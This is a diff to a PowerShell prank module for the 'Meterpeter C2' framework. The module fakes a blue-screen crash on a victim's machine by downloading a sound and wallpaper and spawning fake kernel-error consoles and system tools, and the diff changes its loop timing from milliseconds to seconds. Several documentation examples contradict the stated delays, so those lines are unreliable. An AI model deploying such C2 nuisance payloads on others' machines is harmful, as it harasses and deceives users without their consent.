@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19043) x64 bits
    Required Dependencies: IWR, Media.SoundPlayer {native}
    Optional Dependencies: Critical.wav {auto-download}
-   PS cmdlet Dev version: v1.2.10
+   PS cmdlet Dev version: v1.2.11
 
 .DESCRIPTION
    Auxiliary module of Meterpeter C2 v2.10.12 that executes a prank in background.
@@ -26,7 +26,7 @@
    How many times to loop (default: 20)
 
 .Parameter DelayTime
-   The delay time between each loop (default: 200)
+   The delay time between each loop (default: 30)
 
 .Parameter WaveFile
    Accepts the main sfx effect file (default: Critical.wav)
@@ -43,15 +43,15 @@
 
 .EXAMPLE
    PS C:\> .\C2Prank.ps1 -MaxInteractions '8'
-   Loops for 8 times max with 200 milliseconds delay
+   Loops for 8 times max with 30 seconds delay
 
 .EXAMPLE
-   PS C:\> .\C2Prank.ps1 -DelayTime '2000'
+   PS C:\> .\C2Prank.ps1 -DelayTime '2'
    Loops for 20 times max with 2 seconds delay
 
 .EXAMPLE
-   PS C:\> .\C2Prank.ps1 -delaytime '100' -wavefile 'alert.wav'
-   Loops for 20 times with 100 milliseconds of delay + alert.wav as sfx
+   PS C:\> .\C2Prank.ps1 -delaytime '0' -wavefile 'alert.wav'
+   Loops for 20 times with 60 seconds of delay + alert.wav as sfx
 
 .EXAMPLE
    PS C:\> .\C2Prank.ps1 -MaxInteractions '8' -BSODWallpaper 'true'
@@ -63,7 +63,7 @@
 .OUTPUTS
    * Powershell Fake BSOD Prank
      => Download 'Critical error' sfx sound effect
-   * maxinteractions: 20 with: 200 (milliseconds)
+   * maxinteractions: 20 with: 20 (seconds)
    * Modify desktop wallpaper to BSOD wallpaper
      => Download BSOD wallpaper from my github repo
      => Add TypeDefinition and set wallpaper automatic
@@ -80,7 +80,7 @@
    [string]$BSODwallpaper="false",   #Change desktop wallpaper?
    [string]$PreventBSOD="true",      #Prevent the prank from BSOD?
    [int]$MaxInteractions='20',       #How many times to loop jump?
-   [int]$DelayTime='200'             #Delay time between loops? (milliseconds)
+   [int]$DelayTime='30'              #Delay time between loops? (seconds)
 )
 
 
@@ -133,11 +133,11 @@ If($PreventBSOD -ieq "true")
 
 
 #lOOP Function
-write-host "* maxinteractions: $MaxInteractions with: $DelayTime (milliseconds)" -ForegroundColor Green
+write-host "* maxinteractions: $MaxInteractions with: $DelayTime (seconds)" -ForegroundColor Green
 For($i=1; $i -lt $MaxInteractions; $i++)
 {
    #Delay time before playing sfx
-   Start-Sleep -Milliseconds $DelayTime
+   Start-Sleep -Seconds $DelayTime
 
    If($i -Match '^(1|3|5|7|9|11|13|15|17|19|21|23|25|27|29|30|40|50|60|70|80|90|97|98|99|100)$')
    {
@@ -159,17 +159,17 @@ For($i=1; $i -lt $MaxInteractions; $i++)
    #Spawn cmd terminal console and make it look like one kernel error as ocurr
    Start-Process cmd.exe -argumentlist "/c color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"
 
-   If($i -Match '^(3|7|12|16|18|20|30|40|50|60|70|80|90|97|98|99|100)$')
+   If($i -Match '^(3|7|12|13|15|16|18|20|23|27|30|32|33|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open drive manager
       Start-Process diskmgmt.msc
    }
-   ElseIf($i -Match '^(5|9|14|17|19|21|30|40|50|60|70|80|90|97|98|99|100)$')
+   ElseIf($i -Match '^(5|9|14|17|18|19|20|21|25|29|30|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open firewall manager
       Start-Process firewall.cpl
    }
-   ElseIf($i -Match '^(6|8|13|15|20|22|23|24|30|40|50|60|70|80|90|97|98|99|100)$')
+   ElseIf($i -Match '^(6|8|9|11|13|15|17|19|20|22|23|24|30|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open programs manager
       Start-Process appwiz.cpl
